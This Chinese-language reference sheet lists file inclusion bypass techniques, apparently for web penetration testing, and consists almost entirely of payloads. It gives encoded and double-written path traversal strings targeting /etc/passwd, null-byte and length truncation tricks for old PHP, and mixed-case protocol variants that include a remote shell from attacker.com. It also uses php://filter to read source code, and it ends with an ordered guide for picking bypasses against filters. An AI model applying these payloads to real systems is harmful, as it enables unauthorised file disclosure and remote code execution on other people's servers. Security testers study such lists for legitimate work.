# 文件包含绕过技术参考

当基础文件包含测试被过滤或拦截时，使用以下绕过技术。

## 路径遍历绕过

```bash
# 双写绕过 (过滤器删除 ../ 一次)
....//....//....//etc/passwd
..../\..../\..../\etc/passwd

# URL 编码 (单次)
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

# URL 双重编码
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd

# Unicode 编码
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
```

## 后缀绕过

```bash
# 空字节截断 (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.php
../../../etc/passwd%00.jpg

# 路径截断 - 利用长路径 (PHP < 5.3, 4096字符限制)
../../../etc/passwd/./././././[重复至4096字符]/./

# 问号截断
../../../etc/passwd?
../../../etc/passwd?.php
```

## 过滤器绕过

```bash
# ../被过滤时的替代写法
....//          # 双写
..../\          # 混合分隔符
....\/          # 反斜杠变体
%2e%2e%2f       # URL编码
%2e%2e/         # 部分编码
..%2f           # 部分编码
%2e%2e%5c       # Windows反斜杠编码

# "etc/passwd"被关键字过滤
/etc/./passwd
/etc/passwd/.
/etc//passwd
/etc/passwd/
```

## 协议绕过

```bash
# http:// 被过滤 - 大小写混合
hTtP://attacker.com/shell.txt
HTTP://attacker.com/shell.txt
//attacker.com/shell.txt      # 协议相对URL

# php:// 被过滤 - 大小写混合
PHP://filter/convert.base64-encode/resource=index.php
pHp://filter/convert.base64-encode/resource=index.php
```

## 绕过选择决策

1. **确定过滤类型**: 先发送正常payload观察响应差异
2. **路径被过滤**: 尝试双写 → URL编码 → 双重编码 → Unicode
3. **后缀被强制添加**: 尝试空字节 → 路径截断 → 问号截断
4. **关键字被过滤**: 尝试路径规范化变体 (`/./`, `//`, 末尾`/`)
5. **协议被过滤**: 尝试大小写混合 → 协议相对URL
